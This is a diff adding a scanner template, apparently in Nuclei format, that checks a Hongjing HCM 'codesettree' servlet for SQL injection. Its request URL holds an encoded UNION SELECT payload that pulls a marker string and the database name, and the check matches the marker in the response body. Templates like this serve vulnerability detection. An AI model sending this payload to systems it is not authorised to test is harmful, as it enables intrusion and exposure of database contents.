@@ -1,0 +1,24 @@
+id: hongjingHcm-categories-sql
+ 
+info:
+  name: hongjingHcm-categories-sql
+  author: sm
+  severity: critical
+  tags: hongjing
+ 
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hellohongjingHcm~27~2cdb~5fname~28~29~2d~2d&codesetid=1&flag=c&parentid=-1&status=1"
+    matchers-condition: and           
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'hellohongjingHcm'
+          - "?xml"
+        condition: and  
+      
+      - type: status
+        status:
+          - 200
